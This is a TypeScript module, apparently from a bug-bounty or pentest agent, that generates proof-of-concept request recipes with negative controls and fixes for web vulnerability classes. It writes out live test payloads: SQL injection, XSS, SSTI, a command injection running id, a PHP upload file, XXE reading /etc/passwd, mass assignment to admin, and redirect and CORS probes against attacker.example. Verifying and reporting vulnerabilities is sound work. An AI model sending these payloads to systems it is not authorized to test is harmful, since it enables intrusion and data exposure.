/** Auto-PoC — turn a finding into a copy-paste-ready reproduction recipe.
 *
 *  The submission gate's first question is "reproducible?" — but the agent still
 *  has to figure out HOW to reproduce. This generator removes that gap: given a
 *  vuln class + target + endpoint + param, it emits the exact request (with a
 *  MARKER), a NEGATIVE CONTROL, and the expected outcome that PROVES the bug.
 *
 *  Deterministic templates per class (no guessing): each recipe carries a marker,
 *  a control, and the precise differential that confirms it.
 */
import { canonicalId } from "./synonyms.js";
import { patternLookup } from "./patterns.js";

export interface AutoPocInput {
  type: string;
  base_url: string;
  endpoint: string;
  param?: string;
  method?: string;
  token?: string;
  victim_id?: string;
  canary?: string;
}

export interface PocRecipe {
  type: string;
  title: string;
  severity: string;
  marker: string;
  request: string;
  control_request: string;
  expected: string;
  fix: string;
  steps: string[];
}

interface PocTemplate {
  title: (i: AutoPocInput) => string;
  marker: string;
  request: (i: AutoPocInput) => string;
  control: (i: AutoPocInput) => string;
  expected: string;
  fix: string;
  severity: string;
}

const MK = "zzblitz"; // fixed distinctive marker — searchable in a response

const qs = (i: AutoPocInput, value: string): string => {
  const sep = i.endpoint.includes("?") ? "&" : "?";
  return `${i.base_url}${i.endpoint}${sep}${i.param ?? "input"}=${value}`;
};

const POC_TEMPLATES: Record<string, PocTemplate> = {
  sql_injection: {
    severity: "critical",
    marker: `1' OR '1'='1`,
    request: (i) => qs(i, `1' OR '1'='1`),
    control: (i) => qs(i, `1' AND '1'='2`),
    title: (i) => `SQL injection in ${i.endpoint} allows an attacker to read/modify database records`,
    expected: "The OR-true request returns data (or a different response) where the AND-false control returns nothing/error — proving the parameter reaches a SQL query unsanitized.",
    fix: "Parameterize the query (prepared statement) and validate the input type.",
  },
  missing_authz: {
    severity: "high",
    marker: MK,
    request: (i) => `${i.base_url}${i.endpoint.replace(/\{\w+\}|:id|\d+$/, i.victim_id ?? "VICTIM_ID")}`,
    control: (i) => `${i.base_url}${i.endpoint}`,
    title: (i) => `Missing authorization on ${i.endpoint} allows an attacker to access another user's data (IDOR)`,
    expected: "The request with the ATTACKER's token + the VICTIM's object id returns the victim's data (not 401/403) — proving broken object-level authorization.",
    fix: "Enforce per-object ownership checks server-side on every object access.",
  },
  ssrf: {
    severity: "high",
    marker: "http://{canary}",
    request: (i) => qs(i, i.canary ?? "http://CANARY.example"),
    control: (i) => qs(i, "https://example.com"),
    title: (i) => `SSRF via ${i.param ?? "url"} on ${i.endpoint} allows internal network requests`,
    expected: "The server fetches the canary URL — confirm via an OOB listener (oob_start) or by observing a request to an attacker-controlled host.",
    fix: "Allowlist the destination host/scheme and block private/internal ranges (169.254.169.254, 127.0.0.0/8, ::1).",
  },
  xss: {
    severity: "high",
    marker: `<img src=x onerror=alert("${MK}")>`,
    request: (i) => qs(i, encodeURIComponent(`<img src=x onerror=alert("${MK}")>`)),
    control: (i) => qs(i, "benign"),
    title: (i) => `Reflected XSS via ${i.param ?? "input"} on ${i.endpoint} executes script in a victim's session`,
    expected: `The marker \`${MK}\` is reflected UNencoded into the HTML (view-source / drive_devtools confirms the payload is not escaped).`,
    fix: "HTML-encode all output and use a context-aware escaping / DOM-purify allowlist.",
  },
  ssti: {
    severity: "high",
    marker: "{{7*7}}",
    request: (i) => qs(i, encodeURIComponent("{{7*7}}")),
    control: (i) => qs(i, "7"),
    title: (i) => `Server-side template injection on ${i.endpoint} allows remote code execution`,
    expected: "The response contains `49` (the expression evaluated) instead of the literal `{{7*7}}`.",
    fix: "Do not render user input through a template engine; use a sandboxed renderer.",
  },
  command_injection: {
    severity: "critical",
    marker: `; echo ${MK}$(id)`,
    request: (i) => qs(i, encodeURIComponent(`; echo ${MK}$(id)`)),
    control: (i) => qs(i, "normal"),
    title: (i) => `Command injection via ${i.param ?? "input"} on ${i.endpoint} allows OS command execution`,
    expected: `The response (or the OOB callback) contains \`${MK}uid=\` — the command executed.`,
    fix: "Avoid shelling out with user input; use exec-argument APIs (no shell) and allowlist values.",
  },
  file_upload: {
    severity: "high",
    marker: MK,
    request: (i) => `POST ${i.base_url}${i.endpoint} (multipart) with file "poc.php" containing \`<?php echo "${MK}"; ?>\``,
    control: (i) => `POST ${i.base_url}${i.endpoint} (multipart) with file "poc.txt" containing "benign"`,
    title: (i) => `Unrestricted file upload on ${i.endpoint} allows arbitrary code execution`,
    expected: `Requesting the uploaded file returns \`${MK}\` — the PHP executes server-side.`,
    fix: "Allowlist extensions, validate MIME + magic bytes, store outside webroot, serve via a sanitized handler.",
  },
  mass_assignment: {
    severity: "high",
    marker: `"role":"admin"`,
    request: (i) => `POST ${i.base_url}${i.endpoint} body={"role":"admin","is_admin":true}`,
    control: (i) => `POST ${i.base_url}${i.endpoint} body={"role":"user"}`,
    title: (i) => `Mass assignment on ${i.endpoint} allows privilege escalation to admin`,
    expected: "The response reflects the elevated role (or subsequent requests act as admin) — the server bound the injected field.",
    fix: "Use an explicit allowlist of bindable fields; never bind role/privilege fields from request input.",
  },
  jwt_alg_confusion: {
    severity: "critical",
    marker: MK,
    request: (i) => `GET ${i.base_url}${i.endpoint} Authorization: Bearer <forged HS256 token signed with the public key>`,
    control: (i) => `GET ${i.base_url}${i.endpoint} Authorization: Bearer <attacker's RS256 token>`,
    title: (i) => `JWT algorithm confusion on ${i.endpoint} allows forging admin tokens`,
    expected: "The forged HS256 token (signed with the public key) is accepted as admin — verify by reaching an admin-only endpoint.",
    fix: "Pin the expected algorithm server-side and never accept HS256 when the key is asymmetric/public.",
  },
  crlf_injection: {
    severity: "medium",
    marker: MK,
    request: (i) => qs(i, encodeURIComponent(`x%0d%0aX-Injected: ${MK}`)),
    control: (i) => qs(i, "x"),
    title: (i) => `CRLF injection via ${i.param ?? "input"} on ${i.endpoint} allows response splitting / header injection`,
    expected: `The response contains an injected \`X-Injected: ${MK}\` header.`,
    fix: "Strip CR/LF from any value placed into a response header.",
  },
  open_redirect: {
    severity: "medium",
    marker: "https://attacker.example",
    request: (i) => qs(i, encodeURIComponent("https://attacker.example")),
    control: (i) => qs(i, encodeURIComponent("https://target.com/legit")),
    title: (i) => `Open redirect via ${i.param ?? "url"} on ${i.endpoint} can be chained into token theft`,
    expected: "The response issues a 30x to `https://attacker.example`.",
    fix: "Allowlist redirect targets and validate the exact destination.",
  },
  xxe: {
    severity: "high",
    marker: MK,
    request: (i) => `POST ${i.base_url}${i.endpoint} body=<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`,
    control: (i) => `POST ${i.base_url}${i.endpoint} body=<?xml version="1.0"?><x>benign</x>`,
    title: (i) => `XXE on ${i.endpoint} allows arbitrary file read`,
    expected: "The response contains /etc/passwd content (or the OOB callback fires for the external entity).",
    fix: "Disable DTD/external entity resolution and use a hardened XML parser.",
  },
  prototype_pollution: {
    severity: "high",
    marker: MK,
    request: (i) => `POST ${i.base_url}${i.endpoint} body={"__proto__":{"polluted":"${MK}"}}`,
    control: (i) => `POST ${i.base_url}${i.endpoint} body={"safe":"x"}`,
    title: (i) => `Prototype pollution on ${i.endpoint} allows application-wide object tampering`,
    expected: `A later read of \`({}).polluted\` returns \`${MK}\` (or the behavior changes observably).`,
    fix: "Block __proto__/constructor/prototype keys and use Object.create(null) / safe merge.",
  },
  deserialization: {
    severity: "critical",
    marker: MK,
    request: (i) => `POST ${i.base_url}${i.endpoint} body=<serialized gadget payload (ysoserial/phpggc) with command "echo ${MK}">`,
    control: (i) => `POST ${i.base_url}${i.endpoint} body=<benign serialized object>`,
    title: (i) => `Insecure deserialization on ${i.endpoint} allows remote code execution`,
    expected: `The command executes — confirm via the OOB callback or the \`${MK}\` marker in the response/log.`,
    fix: "Never deserialize untrusted input; prefer safe formats (JSON) + integrity checks.",
  },
  hardcoded_secret: {
    severity: "high",
    marker: MK,
    request: (i) => `GET ${i.base_url}${i.endpoint} with the leaked key — enumerate what it can access`,
    control: (i) => `GET ${i.base_url}${i.endpoint} with no key (expect 401)`,
    title: (i) => `Hardcoded credential on ${i.endpoint} grants unauthorized access to sensitive resources`,
    expected: "The leaked key authenticates (200 vs 401) and enumerates its scope — proving it is ACTIVE, not just present.",
    fix: "Rotate the credential, move it to a secret manager, and revoke the leaked value.",
  },
  cache_deception: {
    severity: "high",
    marker: MK,
    request: (i) => `${i.base_url}${i.endpoint}.css (authenticated — triggers caching of the private response)`,
    control: (i) => `${i.base_url}${i.endpoint} (baseline private response)`,
    title: (i) => `Web cache deception on ${i.endpoint} serves a victim's private response to anonymous users`,
    expected: "Re-fetching the `.css` URL anonymously returns the victim's private content (body matches the authenticated baseline).",
    fix: "Include the session cookie in the cache key or disable caching for authenticated responses.",
  },
  cors_misconfiguration: {
    severity: "medium",
    marker: MK,
    request: (i) => `GET ${i.base_url}${i.endpoint} Origin: https://attacker.example (with credentials/cookies)`,
    control: (i) => `GET ${i.base_url}${i.endpoint} Origin: https://target.com`,
    title: (i) => `CORS misconfiguration on ${i.endpoint} lets any site read the victim's authenticated responses`,
    expected: "The response echoes `Access-Control-Allow-Origin: https://attacker.example` AND `Access-Control-Allow-Credentials: true`.",
    fix: "Validate Origin against a static allowlist and never combine a reflected origin with credentials.",
  },
  subdomain_takeover: {
    severity: "medium",
    marker: MK,
    request: (i) => `dig CNAME ${i.endpoint} (verify the target resolves to an unclaimed service)`,
    control: (i) => `dig A ${i.endpoint} (a live A record = not takeable)`,
    title: (i) => `Subdomain takeover on ${i.endpoint} allows serving attacker content on the victim's domain`,
    expected: "The CNAME target returns NXDOMAIN / a 'not found' provisioning page (GitHub 404, S3 NoSuchBucket) — claimable.",
    fix: "Remove the dangling DNS record and audit for other dangling references.",
  },
};

export function autoPoc(input: AutoPocInput): PocRecipe {
  const type = canonicalId(input.type);
  const tpl = POC_TEMPLATES[type] ?? POC_TEMPLATES.missing_authz;
  const pat = patternLookup(type);
  const severity = pat?.severity ?? tpl.severity;
  return {
    type,
    title: tpl.title(input),
    severity,
    marker: tpl.marker,
    request: tpl.request(input),
    control_request: tpl.control(input),
    expected: tpl.expected,
    fix: tpl.fix,
    steps: [
      `1. Send the control request and record the baseline: \`${tpl.control(input)}\``,
      `2. Send the marker request: \`${tpl.request(input)}\``,
      `3. Confirm the differential — ${tpl.expected}`,
      `4. Attach the evidence (status codes + response bodies) and report.`,
    ],
  };
}

export function listPocTypes(): string[] {
  return Object.keys(POC_TEMPLATES).sort();
}
